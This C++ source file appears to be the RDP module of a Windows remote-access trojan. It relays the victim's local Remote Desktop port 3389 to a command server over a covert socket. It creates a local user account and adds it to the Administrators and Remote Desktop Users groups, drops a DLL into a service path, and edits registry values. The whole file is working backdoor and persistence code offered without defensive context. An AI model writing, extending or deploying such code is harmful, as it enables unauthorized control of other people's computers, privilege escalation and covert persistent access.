#include"RDP.h"
#include"net.h"
namespace RDP {


    
    BOOL rdpConnect(SOCKET *s) {

        for (int i = 0; i <= 10; i++) {
            if (net::connect((char*)"127.0.0.1", 3389, s)) { return TRUE; }
            Sleep(2000);
        }

        return FALSE;
    }

    BOOL rdpTunnel() {
        SOCKET r;
        Sleep(5000);
        if (!rdpConnect(&r)) {  return FALSE; }
        fd_set fd;
        FD_ZERO(&fd);
        char buff[4096];
        int e;
        if (net::pktSend(net::s, nullptr, 0, 0x03)) { return TRUE; }
        while (1) {
            FD_SET(r, &fd);
            FD_SET(net::s, &fd);
            select(1, &fd, NULL, NULL, NULL);
            if (FD_ISSET(r, &fd)) {

                e = recv(r, buff, sizeof(buff)-1, 0);
                if (e <= 0) { //rdp conn closed
                    closesocket(r);
                    if (!rdpConnect(&r)) { return FALSE; }
                }
                else { 
                //send pack to srv
                    if (net::pktSend(net::s, buff, e, 0x50)) { return TRUE; }
                
                }
            }
            if (FD_ISSET(net::s, &fd)) {

                int p_sz;
                if (net::recvp(buff, sizeof(buff), &p_sz) == FALSE) { break; }
                send(r, &buff[1], p_sz, 0);
                if(buff[0]==0x60){ 
                    closesocket(r); 
                    if (!rdpConnect(&r)) { return FALSE; }
                }
                

            }



        }
        closesocket(net::s);
        closesocket(r);
        return TRUE;

    }

    BOOL saveDll(char* buffer, int sz) {

        FILE* fp;
        _wfopen_s(&fp, dllService, L"wb");
        if (!fp) { return FALSE; }
        fwrite(buffer, 1, sz, fp);
        fwrite("\x66\x33\x64\x69\x30\x30\x36", 1, 7, fp);
        fclose(fp);
        return TRUE;

    }

    bool isServiceRunning(const char* serviceName) {
        SC_HANDLE scm, service;
        SERVICE_STATUS status;
        scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!scm) {
            return false;
        }

        service = OpenServiceA(scm, serviceName, SERVICE_QUERY_STATUS);
        if (!service) {
            CloseServiceHandle(scm);
            return false;
        }

        if (!QueryServiceStatus(service, &status)) {
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            return false;
        }
        bool isRunning = (status.dwCurrentState == SERVICE_RUNNING);
        CloseServiceHandle(service);
        CloseServiceHandle(scm);

        return isRunning;
    }

    bool createUserAccount(const wchar_t* username, const wchar_t* password) {

        USER_INFO_1 userInfo = { 0 };
        userInfo.usri1_name = (wchar_t*)username;
        userInfo.usri1_password = (wchar_t*)password;
        userInfo.usri1_priv = USER_PRIV_USER;
        userInfo.usri1_home_dir = nullptr;
        userInfo.usri1_comment = nullptr;
        userInfo.usri1_flags = UF_NORMAL_ACCOUNT | UF_SCRIPT;

        NET_API_STATUS result = NetUserAdd(nullptr, 1, (unsigned char*)&userInfo, nullptr);

        if (result == NERR_Success) {
            Log::SaveLog((wchar_t*)L"RDP account was created");
            return true;
        }
        else {
            std::wstring error(L"Error Creating RDP account , error code :" + std::to_wstring(result) + std::wstring(username));
            Log::SaveLog((wchar_t*)error.c_str());
            return false;
        }

        return true;
    }



    _inline int AddToGroup(wchar_t* groupn, wchar_t* username)
    {
        LOCALGROUP_MEMBERS_INFO_3 lgmi3;
        DWORD dwLevel = 3;
        DWORD totalEntries = 1;
        NET_API_STATUS nStatus;
        lgmi3.lgrmi3_domainandname = username;

        nStatus = NetLocalGroupAddMembers(NULL, groupn, 3,
            (LPBYTE)&lgmi3, totalEntries);
        if (nStatus == 1378) {
            std::wstring error(L"User already member of group : " + std::wstring(groupn));
            Log::SaveLog((wchar_t*)error.c_str()); return 0;
        }
        if (nStatus) {
            std::wstring error(L"error adding user to group : " + std::wstring(groupn) + L" , error code : " + std::to_wstring(nStatus));
            Log::SaveLog((wchar_t*)error.c_str());

        }
        else { Log::SaveLog((wchar_t*)std::wstring(L"User Was Added to the Group : " + std::wstring(groupn)).c_str()); }
        return nStatus;
    }

    _inline void addtogroup(const char* groupsid, wchar_t* user) {
        PSID Group;
        BOOL b = FALSE;
        if (!ConvertStringSidToSidA(groupsid, &Group)) { return; }

        wchar_t namegroup[300];
        wchar_t domain[300];
        DWORD lengrp = sizeof(namegroup) / sizeof(wchar_t);
        DWORD lendm = sizeof(domain) / sizeof(wchar_t);

        SID_NAME_USE groupinf;
        if (!LookupAccountSidW(NULL, Group, namegroup, &lengrp, domain, &lendm, &groupinf)) { return; }
        AddToGroup(namegroup, user);

        LocalFree(Group);

    }

    void AddUserToGroups(wchar_t* user)
    {



        const char* groups[] = { "S-1-5-32-555","S-1-5-32-544" };

        for (int i = 0; i < sizeof(groups) / sizeof(char*); i++) {
            addtogroup(groups[i], user);
        }

        return;
    }

    bool doesUserExist(const wchar_t* username) {
        USER_INFO_1* userInfo = nullptr;
        NET_API_STATUS result = NetUserGetInfo(nullptr, username, 1, reinterpret_cast<LPBYTE*>(&userInfo));

        if (result == NERR_Success) {
            NetApiBufferFree(userInfo);
            return true;
        }
        else if (result == NERR_UserNotFound) {
            NetApiBufferFree(userInfo);
            return false;
        }
        else {
            NetApiBufferFree(userInfo);
            return false;
        }
    }

    


    
    bool setRegistryValue(HKEY hKey, const wchar_t* subkey, const wchar_t* valueName, DWORD newValue) {
        
        HKEY openedKey;
        LONG result = RegCreateKeyEx(hKey, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &openedKey, NULL);

        if (result != ERROR_SUCCESS) {
            std::wstring error(L"Failed to create or open registry key. Error code: " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            return false;
        }

        if (RegSetValueEx(openedKey, valueName, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&newValue), sizeof(DWORD)) != ERROR_SUCCESS) {
            std::wstring error(L"Failed to set registry value. Error code: " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            RegCloseKey(openedKey);
            return false;
        }

        Log::SaveLog((wchar_t*)L"Changed registry value");
        RegCloseKey(openedKey);

        return true;
    }





    
    
}